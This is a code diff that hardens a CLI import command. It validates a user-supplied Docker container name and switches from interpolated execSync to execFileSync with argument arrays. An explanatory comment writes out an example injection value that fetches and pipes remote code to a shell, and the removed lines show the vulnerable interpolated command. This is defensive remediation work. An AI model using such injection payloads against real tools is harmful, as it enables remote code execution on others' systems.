@@ -188,6 +188,14 @@ export const importCommand: Command = {
     const outputFile = ctx.flags.output as string | undefined;
     const batchSize = (ctx.flags['batch-size'] as number) || 100;
     const containerName = (ctx.flags.container as string) || 'ruvector-postgres';
+    // SECURITY: containerName is interpolated into shell commands below.
+    // Without validation, --container 'x; curl evil | sh; #' becomes a shell
+    // metachar payload. Validate against Docker's documented container-name
+    // syntax: ^[a-zA-Z0-9][a-zA-Z0-9_.-]{0,127}$
+    if (!/^[a-zA-Z0-9][a-zA-Z0-9_.-]{0,127}$/.test(containerName)) {
+      output.printError(`Invalid container name: must match Docker syntax [a-zA-Z0-9][a-zA-Z0-9_.-]{0,127}`);
+      return { success: false, message: 'Invalid container name' };
+    }
     const verbose = ctx.flags.verbose as boolean;
 
     output.writeln();
@@ -338,9 +346,11 @@ export const importCommand: Command = {
         output.writeln();
 
         // Execute via child_process
-        const { execSync } = await import('child_process');
+        const { execFileSync } = await import('child_process');
         try {
-          const result = execSync(`docker exec -i ${containerName} psql -U claude -d monomind < ${tempFile}`, {
+          const sqlContent = fs.readFileSync(tempFile);
+          const result = execFileSync('docker', ['exec', '-i', containerName, 'psql', '-U', 'claude', '-d', 'monomind'], {
+            input: sqlContent,
             encoding: 'utf-8',
             timeout: 60000,
           });
